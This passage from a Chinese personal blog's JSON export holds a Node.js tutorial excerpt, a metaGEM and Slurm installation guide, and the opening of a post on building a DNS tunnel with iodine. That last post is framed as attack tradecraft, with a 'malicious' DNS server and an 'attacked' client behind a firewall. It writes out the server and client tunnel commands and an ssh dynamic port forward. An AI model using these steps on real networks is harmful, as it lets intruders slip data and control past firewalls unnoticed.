12&#123;&quot;type&quot;:&quot;Buffer&quot;,&quot;data&quot;:[1,2,3,4,5]&#125;&lt;Buffer 01 02 03 04 05&gt; b.Stream读入流 1234567891011121314151617var fs = require(&quot;fs&quot;);var data = &#x27;&#x27;;// 创建可读流var readerStream = fs.createReadStream(&#x27;input.txt&#x27;);// 设置编码为 utf8。readerStream.setEncoding(&#x27;UTF8&#x27;);// 处理流事件 --&gt; data, end, and errorreaderStream.on(&#x27;data&#x27;, function(chunk) &#123; data += chunk;&#125;);readerStream.on(&#x27;end&#x27;,function()&#123; console.log(data);&#125;);readerStream.on(&#x27;error&#x27;, function(err)&#123; console.log(err.stack);&#125;);console.log(&quot;程序执行完毕&quot;); 写入流 12345678910111213141516var fs = require(&quot;fs&quot;);var data = &#x27;菜鸟教程官网地址：www.runoob.com&#x27;;// 创建一个可以写入的流，写入到文件 output.txt 中var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// 使用 utf8 编码写入数据writerStream.write(data,&#x27;UTF8&#x27;);// 标记文件末尾writerStream.end();// 处理流事件 --&gt; finish、errorwriterStream.on(&#x27;finish&#x27;, function() &#123; console.log(&quot;写入完成。&quot;);&#125;);writerStream.on(&#x27;error&#x27;, function(err)&#123; console.log(err.stack);&#125;);console.log(&quot;程序执行完毕&quot;); 管道流 123456789var fs = require(&quot;fs&quot;);// 创建一个可读流var readerStream = fs.createReadStream(&#x27;input.txt&#x27;);// 创建一个可写流var writerStream = fs.createWriteStream(&#x27;output.txt&#x27;);// 管道读写操作// 读取 input.txt 文件内容，并将内容写入到 output.txt 文件中readerStream.pipe(writerStream);console.log(&quot;程序执行完毕&quot;); 链式流 链式是通过连接输出流到另外一个流并创建多个流操作链的机制。链式流一般用于管道操作。 接下来我们就是用管道和链式来压缩和解压文件。 1234567var fs = require(&quot;fs&quot;);var zlib = require(&#x27;zlib&#x27;);// 压缩 input.txt 文件为 input.txt.gzfs.createReadStream(&#x27;input.txt&#x27;) .pipe(zlib.createGzip()) .pipe(fs.createWriteStream(&#x27;input.txt.gz&#x27;));console.log(&quot;文件压缩完成。&quot;); 4.模块系统为了让Node.js的文件可以相互调用，Node.js提供了一个简单的模块系统。 模块是Node.js 应用程序的基本组成部分，文件和模块是一一对应的。换言之，一个 Node.js 文件就是一个模块，这个文件可能是JavaScript 代码、JSON 或者编译过的C&#x2F;C++ 扩展。 引入模块 在 Node.js 中，引入一个模块非常简单，如下我们创建一个 main.js 文件并引入 hello 模块，代码如下: 12var hello = require(&#x27;./hello&#x27;);hello.world(); 以上实例中，代码 require(‘.&#x2F;hello’) 引入了当前目录下的 hello.js 文件（.&#x2F; 为当前目录，node.js 默认后缀为 js）。 Node.js 提供了 exports 和 require 两个对象，其中 exports 是模块公开的接口，require 用于从外部获取一个模块的接口，即所获取模块的 exports 对象。 接下来我们就来创建 hello.js 文件，代码如下： 123exports.world = function() &#123; console.log(&#x27;Hello World&#x27;);&#125; 在以上示例中，hello.js 通过 exports 对象把 world 作为模块的访问接口，在 main.js 中通过 require(‘.&#x2F;hello’) 加载这个模块，然后就可以直接访 问 hello.js 中 exports 对象的成员函数了。 有时候我们只是想把一个对象封装到模块中，格式如下： 123module.exports = function() &#123; // ...&#125; 例如 1234567891011//hello.js function Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log(&#x27;Hello &#x27; + name); &#125;; &#125;; module.exports = Hello; 这样就可以直接获得这个对象了： 12345//main.js var Hello = require(&#x27;./hello&#x27;); hello = new Hello(); hello.setName(&#x27;BYVoid&#x27;); hello.sayHello(); 5.函数函数可以作为值进行传递如下 1234567function say(word) &#123; console.log(word);&#125;function execute(someFunction, value) &#123; someFunction(value);&#125;execute(say, &quot;Hello&quot;); 或者使用匿名函数，直接在另一个函数的括号中定义和传递这个函数： 1234function execute(someFunction, value) &#123; someFunction(value);&#125;execute(function(word)&#123; console.log(word) &#125;, &quot;Hello&quot;); 6.NodeJS路由我们要为路由提供请求的 URL 和其他需要的 GET 及 POST 参数，随后路由需要根据这些数据来执行相应的代码。 因此，我们需要查看 HTTP 请求，从中提取出请求的 URL 以及 GET&#x2F;POST 参数。这一功能应当属于路由还是服务器（甚至作为一个模块自身的功能）确实值得探讨，但这里暂定其为我们的HTTP服务器的功能。 我们需要的所有数据都会包含在 request 对象中，该对象作为 onRequest() 回调函数的第一个参数传递。但是为了解析这些数据，我们需要额外的 Node.JS 模块，它们分别是 url 和 querystring 模块。 12345678910111213url.parse(string).query | url.parse(string).pathname | | | | | ------ -------------------http://localhost:8888/start?foo=bar&amp;hello=world --- ----- | | | | querystring.parse(queryString)[&quot;foo&quot;] | | querystring.parse(queryString)[&quot;hello&quot;] (菜鸟这个图做的太棒了) 现在我们来给 onRequest() 函数加上一些逻辑，用来找出浏览器请求的 URL 路径： server.js代码 1234567891011121314151617181920var http = require(&quot;http&quot;);var url = require(&quot;url&quot;); function start(route) &#123; function onRequest(request, response) &#123; var pathname = url.parse(request.url).pathname; console.log(&quot;Request for &quot; + pathname + &quot; received.&quot;); route(pathname); response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end(); &#125; http.createServer(onRequest).listen(8888); console.log(&quot;Server has started.&quot;);&#125; exports.start = start; router.js代码 12345function route(pathname) &#123; console.log(&quot;About to route a request for &quot; + pathname);&#125; exports.route = route; index.js代码 123var server = require(&quot;./server&quot;);var router = require(&quot;./router&quot;);server.start(router.route); 7.全局对象JavaScript 中有一个特殊的对象，称为全局对象（Global Object），它及其所有属性都可以在程序的任何地方访问，即全局变量。 在浏览器 JavaScript 中，通常 window 是全局对象， 而 Node.js 中的全局对象是 global，所有全局变量（除了 global 本身以外）都是 global 对象的属性。 在 Node.js 我们可以直接访问到 global 的属性，而不需要在应用中包含它。 略","categories":[{"name":"Electron-Vue-WebRTC客户端学习","slug":"Electron-Vue-WebRTC客户端学习","permalink":"https://snowman12137.github.io/categories/Electron-Vue-WebRTC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Nodejs学习","slug":"Nodejs学习","permalink":"https://snowman12137.github.io/tags/Nodejs%E5%AD%A6%E4%B9%A0/"}],"author":"Sn0wma1n"},{"title":"metaGEM使用小记(解决各种问题)2024.1(一)","slug":"metaGEM使用小记-解决各种问题-2024-1（一）-2a55eec867d5441b9829bd5428024882","date":"2024-01-27T16:00:00.000Z","updated":"2024-03-02T14:17:34.117Z","comments":true,"path":"2024/01/28/metaGEM使用小记-解决各种问题-2024-1（一）-2a55eec867d5441b9829bd5428024882/","link":"","permalink":"https://snowman12137.github.io/2024/01/28/metaGEM%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0-%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98-2024-1%EF%BC%88%E4%B8%80%EF%BC%89-2a55eec867d5441b9829bd5428024882/","excerpt":"","text":"metaGEM使用小记(解决各种问题)2024.1(一)前言，如何把数据从百度云上下载到linux服务器上可以直接通过pip下载：pip install bypy -y 第一次使用时需要随便输入一个命令以激活授权界面，如输入 bypy info 然后打开提示的连接 将复制的内容粘贴到终端后回车，等待即可。 登陆成功后会提示如下信息 登录百度网盘(我的应用数据&#x2F;bypy&#x2F;你的文件名&#x2F;*&#x2F;文件) 有多个文件建议十个放到一个文件夹里，这样下载出错方便排查 我写了一个脚本可以自动安装download.sh 1234567bypy downdir /RAW-NCBI/0/ ./0/bypy downdir /RAW-NCBI/1/ ./1/bypy downdir /RAW-NCBI/2/ ./2/bypy downdir /RAW-NCBI/3/ ./3/bypy downdir /RAW-NCBI/4/ ./4/bypy downdir /RAW-NCBI/5/ ./5/bypy downdir /RAW-NCBI/6/ ./6/ 因为我有74个文件，因此分成了7组进行下载 在你想存储的文件夹里输入 1nohup bash [download.sh](http://download.sh) &gt; temp.txt &amp; (nohup是在Linux中永久运行的命令，&amp;和其他方式均会因为终端退出而中断。&gt;把下载的过程信息存储到temp.txt，&amp;并放在后台运行，这样下载文件的任务就会自动放到后台了) A.安装123git clone https://github.com/franciscozorrilla/metaGEM.gitcd metaGEMbash env_setup.sh 1.找不到env_setup.sh路径env_setup.sh放在了metaGEM&#x2F;workflow&#x2F;scripts&#x2F;env_setup.sh 但是env_setup.sh里面所有的文件路径是在metaGEM&#x2F;workflow&#x2F;下面的，所以要把env_setup.sh复制到metaGEM&#x2F;workflow&#x2F;下面运行 详解env_setup.sh文件(提取其中关键部分)(已安装anaconda) 12345678conda create -n mamba mamba -c conda-forge #创建新环境下载mabaconda activate mamba #进入mamba环境mamba env create --prefix ./envs/metagem -f envs/metaGEM_env.yml &amp;&amp; source activate envs/metagem &amp;&amp; pip install --user memote carveme smetana #创建metaGEM环境mamba env create --prefix ./envs/metawrap -f envs/metaWRAP_env.yml #创建metaWRAP环境mamba env create --prefix ./envs/prokkaroary -f envs/prokkaroary_env.yml #创建prokkaroary环境#不重要（后面会讲到）:download-db.sh &amp;&amp; source deactivate &amp;&amp; source activate mamba#下载GTDB-tk database (~25 Gb)数据集(丢失download-db.sh文件无法下载)wget https://data.ace.uq.edu.au/public/CheckM_databases/checkm_data_2015_01_16.tar.gz #下载CheckM(275MB) 数据集 因为conda install 下载速度很慢，所以脚本里使用了mamba方式进行下载。使用方法为下载mamba包，然后在此环境下进行下载，如 mamba install requests 上述文件中mamba env create为创建新环境的语句，-f后面的.yml文件为导出的conda标准环境文件，–prefix 为新创建环境的路径 2.在安装metagem时以下界面卡住 在正常加载时，以下界面至少卡住了20h以上，因此排除网络问题 我们看一下对应的metaGEM_env.yml文件内容 该文件为conda标准创建环境的文件格式 123456789101112131415161718192021name: metagemchannels: - conda-forge - bioconda - defaultsdependencies: - bedtools&gt;=2.29.2 - bwa&gt;=0.7.17 - concoct&gt;=1.1.0 - diamond&gt;=2.0.6 - fastp&gt;=0.20.1 - gtdbtk&gt;=1.4.0 - maxbin2&gt;=2.2.7 - megahit&gt;=1.2.9 - metabat2&gt;=2.15 - r-base&gt;=3.5.1 - r-gridextra&gt;=2.2.1 - r-tidyverse - r-tidytext - samtools&gt;=1.9 - snakemake&gt;=5.10.0,&lt;5.31.1 name指的是创建环境的名称，channels指的是下载通道，其中这个conda-forge是比较重要的一个，其是一个用于托管和发布科学计算、数据分析和机器学习的Python 包的社区项目。在conda-forge通道中，您可以找到为conda构建但尚未成为官方Anaconda发行版一部分的包。有一些Python库不能用简单的conda install安装，因为除非应用conda-forge，否则它们的通道是不可用的。根据我的经验，pip比conda更适合研究不同的通道源。例如，如果你想安装python-constraint，你可以通过pip install来安装，但是要通过cond 来安装。您必须指定通道- conda-forge。 我在网上看到有人说用forge走的是外网，因此很慢导致加载卡住，因此，我把channels全部注释掉(默认没有channels项)然后测试，依然失败。 注：如果安装出现了Solving environment: failed with initial frozen solve. Retrying with flexible solve 错误 解决博客 12conda update -n base condaconda update --all 即可解决 在后面的测试中，我发现metawrap和prokkaroary的安装 于是我们把后面的大于等于去掉在进行测试，等了一个小时也没有结果也失败了。 于是我们用土办法，创建环境然后一个一个手动输入加载 12345conda create -p ./envs/metagem python=3.10conda info --envconda activate /home/gc/metaGEM-master/workflow/envs/metagem conda install -c conda-forge bedtools bwa concoct diamond fastp gtdbtk maxbin2 megahit metabat2 r-base r-gridextra r-tidyverse r-tidytext samtools snakemake=5.10.0 -ypip install --user memote carveme smetana 或者以下脚本 因为我每次下载都会报错JASON错误，网上一查是因为缓存的问题，因此我在每一个软件包安装之后会清理缓存，暂时我对这个问题没有很好的解决方法，如果没有这个问题的同学可以删除所有conda clean -i -y 语句，当然保留也没有任何问题。其次bioconda:: 这里面的库都是用bioconda 通道下载的，因此安装时要加上这个语句，不加的话很多包安装不上去。 123456789101112131415161718192021222324252627282930313233#conda create -p ./envs/metagem python=3.10 -y#conda activate ./envs/metagemconda clean -i -yconda install bioconda::bedtools -yconda clean -i -yconda install bioconda::bwa -yconda clean -i -yconda install bioconda::concoct -yconda clean -i -yconda install bioconda::diamond -yconda clean -i -yconda install bioconda::fastp -yconda clean -i -yconda install bioconda::gtdbtk -yconda clean -i -yconda install bioconda::maxbin2 -yconda clean -i -yconda install bioconda::megahit -yconda clean -i -yconda install bioconda::metabat2 -yconda clean -i -yconda install bioconda::r-base -yconda clean -i -yconda install bioconda::r-gridextra -yconda clean -i -yconda install bioconda::r-tidyverse -yconda clean -i -yconda install bioconda::r-tidytext -yconda clean -i -yconda install bioconda::samtools -yconda clean -i -yconda install bioconda::snakemake=5.10.0 -ypip install --user memote carveme smetana B.执行metaGEM.sh在dataset文件夹中的子目录中存放paierd-end的fastq数据，如下所示。MetGEM 将基于dataset文件夹中存在的子文件夹读取示例 ID，并将这些 ID 提供给 Snakefile 作为作业提交的通配符。 我的运行文件树如下图所示 12345678910111213141516171819202122232425262728├── colab│ └── assemblies├── config.yaml├── dataset│ ├── L1EFG190305--AM43│ ├── L1EFG190306--AM51│ ├── L1EFG190309_L1EFG190309--AM61│ ├── L1EFG190324--AW1│ ├── L1EFG190325--AW2│ ├── L1EFG190326--AW3│ └── L1EFG190327--AW4├── envs│ ├── metagem│ ├── metaGEM_env_long.yml│ ├── metaGEM_env.yml│ ├── metaWRAP_env.yml│ ├── prokkaroary│ └── prokkaroary_env.yml├── env_setup.sh├── metaGEM.sh├── rules│ ├── kallisto2concoctTable.smk│ ├── maxbin_single.smk│ ├── metabat_single.smk│ ├── Snakefile_experimental.smk.py│ └── Snakefile_single_end.smk.py├── scripts/└── Snakefile 使用fastp质量过滤reads 每个样本提交一个质量过滤工作，每个过滤工作有2个CPU和20GB 内存，最大运行时间为2小时 1bash metaGEM.sh -t fastp -j 2 -c 2 -m 20 -h 2 1.报错找不到路径 更改config/config.yaml 文件第一行的执行路径即可 如果还是找不到路径则在Snakefile中第一行更改config的路径 如果还是读取不到，则把config.yaml 文件复制到当前文件夹下 2.报错Error parsing number of cores (–cores, -c, -j): must be integer, empty, or ‘all’.第一种情况snakemake版本过高，降低到5.10.0即可解决 第二种情况未执行pip install –user memote carveme smetana 3.报错找不到分析的数据在snakefile文件中，我们可以看到第16&#x2F;17行表示在dataset文件夹下，每一个文件名下面有两个同名加_R1,_R2的文件夹，因此我们要现将文件进行标准化操作， 以下是我们的原始文件数据 我们要把他们进行分类，并且进行改名操作，因此我写了一个自动化分类脚本 123456789101112131415161718192021dataset_path=&quot;/home/gc/bash_all/0&quot; #标准数据的文件夹path_name=&quot;z&quot;tar_path=&quot;/home/gc/metaGEM-master/workflow/dataset&quot; #目标dataset文件夹temp=0for file in `ls $&#123;dataset_path&#125;/`do echo $&#123;file&#125; if (($temp==0)) then mid_temp=$file temp=1 else #命令执行处 #echo $&#123;mid_temp:0:-16&#125; #!!!注意这里，因为我的文件里面后16个字符是固定的，需要替换成如下格式，因此我们把字符串截到16$&#123;mid_temp:0:-16&#125;，如果你的文件后缀不一样，请按照需要更改所有&#x27;16&#x27;的地方 mkdir $&#123;tar_path&#125;/$&#123;mid_temp:0:-16&#125; mv $&#123;dataset_path&#125;/$&#123;mid_temp:0:-16&#125;.R1.raw.fastq.gz $&#123;tar_path&#125;/$&#123;mid_temp:0:-16&#125;/$&#123;mid_temp:0:-16&#125;_R1.fastq.gz mv $&#123;dataset_path&#125;/$&#123;mid_temp:0:-16&#125;.R2.raw.fastq.gz $&#123;tar_path&#125;/$&#123;mid_temp:0:-16&#125;/$&#123;mid_temp:0:-16&#125;_R2.fastq.gz temp=0 fidone 4.提交任务后，nohup.out提示sbatch: error: s_p_parse_file: unable to status file &#x2F;etc&#x2F;slurm-llnl&#x2F;slurm.conf: No such file or directory, retrying in 1sec up to 60sec(有的同学会提示&#x2F;bin&#x2F;sh: sbatch: command not found 之类的，这是没有安装slurm导致的看到有一篇文章写到需要这样安装https://www.thegeekdiary.com/sbatch-command-not-found/) Distribution Command Debian apt-get install slurm-client Ubuntu apt-get install slurm-client Kali Linux apt-get install slurm-client Fedora dnf install slurm OS X brew install slurm Raspbian apt-get install slurm-client 配置slurm有问题，slurm是一个linux服务器中的集群管理和作业调度系统，是项目里很关键的一点，因此要好好学习这里的配置信息 先看看文件 1ls -l /etc/slurm/ 报错没有此文件，表明还没有安装slurm 弯路(后面还有未解决的报错) (失败的教程) https://blog.csdn.net/r1141207831/article/details/125272108 先从https://www.schedmd.com/这里下载，选择对应的版本 12345678910#编译安装前需安装gccyum -y install gcc#接着解压安装tar -jxvf slurm-16.05.11.tar.bz2cd /root/slurm-16.05.11./configuremakemake install#安装成功！ 在make和make install时出现 Ld 返回的1退出状态错误是以前错误的结果。有一个更早的错误ーー对‘hdf5各种方法的未定义引用造成的，因此我猜测是linux版本与slurm版本不同造成的，因此我找了一个适用于Ubuntu20.04 的slurm安装教程 最全slurm安装包列表如下https://src.fedoraproject.org/lookaside/extras/slurm/ a、安装必要文件 12sudo suapt-get install make hwloc libhwloc-dev libmunge-dev libmunge2 munge mariadb-server libmysqlclient-dev -y b、启动启动munge服务 123systemctl enable munge // 设置munge开机自启动systemctl start munge // 启动munge服务systemctl status munge // 查看munge状态 c、编译安装slurm 1234567# 将slurm-21.08.6.tar.bz2源码包放置在/home/fz/package目录下cd /home/fz/packagetar -jxvf slurm-21.08.6.tar.bz2cd slurm-21.08.6/./configure --prefix=/opt/slurm/21.08.6 --sysconfdir=/opt/slurm/21.08.6/etcmake -j16make install 在make时发现缺少hdf5包 我又尝试使用spack高效的包管理器安装hdf5 https://hpc.pku.edu.cn/_book&#x2F;guide&#x2F;soft_env&#x2F;spack.html（教程） 但是报错如下，只能进行手动下载编译 官网下载hdf5 https://support.hdfgroup.org/ftp/HDF5/releases/ 12345678910111213141516171819sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压cd hdf5-1.8.21/ #sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压#依次执行sudo ./configure --prefix=/usr/local/hdf5sudo make #会有很多五颜六色的警告，忽略掉，sudo make check sudo make install#安装成功后，在安装目录/usr/local下出现hdf5文件夹，打开后再切换到该目录下cd /usr/local/hdf5/share/hdf5_examples/csudo ./run-c-ex.sh#执行命令sudo h5cc -o h5_extend h5_extend #如果显示错误，则安装：sudo apt install hdf5-helperssudo apt-get install libhdf5-serial-dev#再执行 sudo h5cc -o h5_extend h5_extend.c #直到执行后没有错误显示#执行命令 sudo ./h5_extend 12345678910111213141516171819sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压cd hdf5-1.8.21/ #sudo tar -xvf hdf5-1.8.21.tar.gz #执行解压#依次执行sudo ./configure --prefix=/usr/local/hdf5sudo make #会有很多五颜六色的警告，忽略掉，sudo make check sudo make install#安装成功后，在安装目录/usr/local下出现hdf5文件夹，打开后再切换到该目录下cd /usr/local/hdf5/share/hdf5_examples/csudo ./run-c-ex.sh#执行命令sudo h5cc -o h5_extend h5_extend #如果显示错误，则安装：sudo apt install hdf5-helperssudo apt-get install libhdf5-serial-dev#再执行 sudo h5cc -o h5_extend h5_extend.c #直到执行后没有错误显示#执行命令 sudo ./h5_extend 装完hdf5后继续make slurm 没有报错！！！完成安装 完成安装，下面进行配置 d、启动数据库 后面是无限的hostname报错，我又重新找了一个教程，这个环境被污染了，如果使用另一个教程装slurm会冲突，但是这个又卸载不干净，于是重做了系统，在另一个教程上面成功了 正确的教程如下 来自https://wxyhgk.com/article%2Fubuntu-slurm(这个文章讲的太好了) 安装与配置1234#安装slurmsudo apt install slurm-wlm slurm-wlm-doc -y#检查是否安装成功slurmd --version 配置slurm 配置文件是放在 /etc/slurm-llnl/ 下面的，使用命令 1sudo vi /etc/slurm-llnl/slurm.conf 填写如下内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687ClusterName=coolControlMachine=master#ControlAddr=#BackupController=#BackupAddr=#MailProg=/usr/bin/s-nailSlurmUser=root#SlurmdUser=rootSlurmctldPort=6817SlurmdPort=6818AuthType=auth/munge#JobCredentialPrivateKey=#JobCredentialPublicCertificate=StateSaveLocation=/var/spool/slurmctldSlurmdSpoolDir=/var/spool/slurmdSwitchType=switch/noneMpiDefault=noneSlurmctldPidFile=/var/run/slurmctld.pidSlurmdPidFile=/var/run/slurmd.pidProctrackType=proctrack/pgid#PluginDir=#FirstJobId=ReturnToService=0#MaxJobCount=#PlugStackConfig=#PropagatePrioProcess=#PropagateResourceLimits=#PropagateResourceLimitsExcept=#Prolog=#Epilog=#SrunProlog=#SrunEpilog=#TaskProlog=#TaskEpilog=#TaskPlugin=#TrackWCKey=no#TreeWidth=50#TmpFS=#UsePAM=## TIMERSSlurmctldTimeout=300SlurmdTimeout=300InactiveLimit=0MinJobAge=300KillWait=30Waittime=0## SCHEDULINGSchedulerType=sched/backfill#SchedulerAuth=#SelectType=select/linear#PriorityType=priority/multifactor#PriorityDecayHalfLife=14-0#PriorityUsageResetPeriod=14-0#PriorityWeightFairshare=100000#PriorityWeightAge=1000#PriorityWeightPartition=10000#PriorityWeightJobSize=1000#PriorityMaxAge=1-0## LOGGINGSlurmctldDebug=infoSlurmctldLogFile=/var/log/slurm-llnl/slurmctld.logSlurmdDebug=infoSlurmdLogFile=/var/log/slurm-llnl/slurmd.logJobCompType=jobcomp/none#JobCompLoc=## ACCOUNTING#JobAcctGatherType=jobacct_gather/linux#JobAcctGatherFrequency=30##AccountingStorageType=accounting_storage/slurmdbd#AccountingStorageHost=#AccountingStorageLoc=#AccountingStoragePass=#AccountingStorageUser=## COMPUTE NODESPartitionName=master Nodes=master Default=NO MaxTime=INFINITE State=UP#NodeName=master State=UNKNOWNNodeName=master Sockets=2 CoresPerSocket=16 ThreadsPerCore=1 State=UNKNOWN 上面的代码中的 ControlMachine&#x3D;master PartitionName&#x3D;master Nodes&#x3D;master Default&#x3D;NO MaxTime&#x3D;INFINITE State&#x3D;UP#NodeName&#x3D;master State&#x3D;UNKNOWNNodeName&#x3D;master Sockets&#x3D;2 CoresPerSocket&#x3D;16 ThreadsPerCore&#x3D;1 State&#x3D;UNKNOWN 我 标红 和 标绿 的地方需要修改，这两部分是是需要修改的，其他的别动。 红色部分修改 使用 hostname 命令可以查看到你的名字，然后把你的到的名字替换上面的 master 绿色部分修改 这部分稍微有点复杂，首先来解释各个名字的意思 Sockets 代表你服务器cpu的个数 CoresPerSocket 代表每个cpu的核数 ThreadsPerCore 代表是否开启超线程，如果开启了超线程就是2，没有开启就是1 使用vi [cxc.sh](http://cxc.sh/) 写以下脚本 1234567891011121314#!/bin/bashcpunum=`cat /proc/cpuinfo| grep &quot;physical id&quot;| sort| uniq| wc -l`echo &quot;CPU 个数: $cpunum&quot;;cpuhx=`cat /proc/cpuinfo | grep &quot;cores&quot; | uniq | awk -F&quot;:&quot; &#x27;&#123;print $2&#125;&#x27;`echo &quot;CPU 核心数：$cpuhx&quot; ; cpuxc=`cat /proc/cpuinfo | grep &quot;processor&quot; | wc -l`echo &quot;CPU 线程数：$cpuxc&quot; ;if [[ `expr $cpunum\\*$[cpuhx*2] ` -eq $cpuxc ]];then echo &quot;开启了超线程&quot;else echo &quot;未开启超线程&quot;fi 然后使用命令 bash [cxc.sh](http://cxc.sh/) 运行脚本，看看线程数是不是核心数的两倍，如果是就开启了，没有就没开启。 完成上面的之后吧对应的数字填写上去就可以了。 完成上述所有的设置之后就能启动服务了shell 12sudo systemctl enable slurmctld --nowsudo systemctl enable slurmd --now 查看slurm队列信息 1sinfo 如果这部分是 idle 就说明是可以的,如果不是 idle 请看这个 如果还是解决不了 比如是drain 其意思是用尽资源 解决文章 sinfo -R 报错Low socket***core***thre 那么直接把Sockets=2 CoresPerSocket=16 这两个参数减少，比如说除以2，留出一定的资源给系统使用，问题就解决了 确定目前队列里没有程序时，执行下列语句就好了（NodeName是上面设置的） 1scontrol update NodeName=m1 State=idle 至此就已经安装完成了 到这里配置slurm就已经结束了 5.提交后sbatch: error: Batch job submission failed: No partition specified or system default partition这个错误也是排查了好久，排查到这个文章 1234[username@master1 ~]# sbatch example.sh --partition computeq #Note that ordering matters here!sbatch: error: Batch job submission failed: No partition specified or system default partition[username@master1 ~]# sbatch --partition=computeq example.shSubmitted batch job 114499 猜测是运行顺序错误导致的问题，于是我们到metaGEM.sh 中排查一下，核心的运行语句如下 1echo &quot;nohup snakemake all -j $njobs -k --cluster-config ../config/cluster_config.json -c &#x27;sbatch -A &#123;cluster.account&#125; -t &#123;cluster.time&#125; --mem &#123;cluster.mem&#125; -n &#123;cluster.n&#125; --ntasks &#123;cluster.tasks&#125; --cpus-per-task &#123;cluster.n&#125; --output &#123;cluster.output&#125;&#x27; &amp;&quot;|bash; break;; 可以看到在后面的sbatch里面没有关于–partition的语句，于是我们手动添加，partition后面的名字就是前面我们设置的主机名 1--partition=你的主机名 1sbatch --partition=的主机名 -A &#123;cluster.account&#125; -t &#123;cluster.time&#125; --mem &#123;cluster.mem&#125; -n &#123;cluster.n&#125; --ntasks &#123;cluster.tasks&#125; --cpus-per-task &#123;cluster.n&#125; --output &#123;cluster.output&#125; 代码中搜索sbatch 有三个地方需要添加，添加后即可正常运行 然后我们运行文章开头的语句 -j 任务数量 -c 每个任务CPU数量 -m 每个任务分配的内存大小 -h 每个任务运行的时间 注:注意CPU过大也不行 1bash metaGEM.sh -t fastp -j 5 -c 4 -m 20 -h 20 然后我们输入squeue 查看刚才提交的任务 到这里我们的环境配置完毕","categories":[{"name":"MAGs云分析","slug":"MAGs云分析","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/"},{"name":"生物计算机科学","slug":"MAGs云分析/生物计算机科学","permalink":"https://snowman12137.github.io/categories/MAGs%E4%BA%91%E5%88%86%E6%9E%90/%E7%94%9F%E7%89%A9%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"}],"tags":[{"name":"metaGEM","slug":"metaGEM","permalink":"https://snowman12137.github.io/tags/metaGEM/"}],"author":"Sn0wma1n"},{"title":"DNS隧道+FRP隧道搭建","slug":"DNS隧道-FRP隧道","date":"2023-12-19T16:00:00.000Z","updated":"2024-03-02T14:20:28.072Z","comments":true,"path":"2023/12/20/DNS隧道-FRP隧道/","link":"","permalink":"https://snowman12137.github.io/2023/12/20/DNS%E9%9A%A7%E9%81%93-FRP%E9%9A%A7%E9%81%93/","excerpt":"","text":"DNS隧道+FRP隧道一、DNS隧道准备1.DNS隧道介绍DNS隧道，是隧道技术的一种。当我们HTTP、HTTPS这样的上层协议、正反向端口转发都失败的时候，可以尝试DNS隧道。DNS隧道很难防范，因为平时的业务等功能难免会用到DNS协议进行解析，所以防火墙大多对DNS流量是放行的状态。这时候，如果我们在不出机器构造一个恶意的域名，本地DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上，于是乎，我们的不出网主机就和恶意DNS服务器交流上了。 搭建DNS隧道的工具目前有iodine，dnscat，dns2tcp等。 我目前使用的是iodine工具去搭建。 2.前期准备1个域名、1个公网服务器 看别的博主使用了一个匿名域名申请网站http://www.freenom.com/zh/index.html，但是我没有申请成功过 于是我去阿里云https://dns.console.aliyun.com/买了付费的域名，正好还可以用在我的博客上。 先添加两条A记录，再添加一条NS记录 第一条A类记录www，告诉域名系统，”www.xiaowublog.top”的IP地址是”39.xxx.xxx.xxx“ 第二条A类记录@，告诉域名系统，”xiaowublog.top”的IP地址是”39.xxx.xxx.xxx“ 第三条NS记录，告诉域名系统，”ns.xiaowublog.top”的域名由”www.xiaowublog.top”进行解析。 到此前期准备工作就已经完成了，已经将域名绑定到了我们的公网服务器上。 (虽然提示10分钟到72小时之内解析完成。但实际上几分钟部分DNS服务器就会刷新好，10分钟左右就会部署完毕，如果点击生效检测没有解析到预定的结果，那么就是配置出了问题) 正常的ns.xxx.xx解析结果应该是如下的 二、iodine DNS隧道搭建在我们的公网服务器安装iodine，该工具服务端为iodined，客户端为iodine。 执行apt install iodine命令会同时安装服务端与客户端。 1.服务端先进入服务器的安全组，一定一定要打开UDP的53端口 在公网服务器上部署iodine服务端。(需要root权限运行) iodined -f -c -P 123.com 192.168.50.1 ns.xiaowublog.top -DD -f：在前台运行 -c：禁止检查所有传入请求的客户端IP地址。 -P：客户端和服务端之间用于验证身份的密码。 -D：指定调试级别，-DD指第二级。“D”的数量随级别增加。 这里的192.168.50.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突注意！填写的地址为NS记录 执行完该命令之后会新生成一个dns0虚拟网卡，ip地址就是刚才命令中输入的ip地址(192.168.50.1)。 DNS默认使用53UDP端口进行转发，所以如果53端口被占用需要kill掉。 2.客户端(被攻击端)客户端我使用的是kali iodine -f -P 123.com ns.xiaowublog.top -M 200 -O base64 (-m 128 我的代码运行时会出现分片错误，所以指定分片大小，可加可不加，若大小选择不合适会导致丢包率极大，传输效率变小) r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道 M：指定上行主机的大小。 m：调节最大下行分片的大小。 f：在前台运行 T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。 O：指定数据编码规范。 P：客户端和服务端之间用于验证身份的密码。 L：指定是否开启懒惰模式，默认开启。 I：指定两个请求之间的时间间隔。 正常运行应该是这样 下图是服务端运行截图，可以看到编码还是有错误的 可以看到kali客户端的网卡也创建成功 ping 192.168.50.2 可以看到在服务器上ping客户端的dns0新网卡可以ping通 现在就相当于公网服务器与kali之间生成了一个虚拟网卡，这两个虚拟网卡之间是互通的。 在公网服务器上连接kali的虚拟地址，使用ssh做一个动态端口转发。 ssh -D 60688 root@192.168.50.2 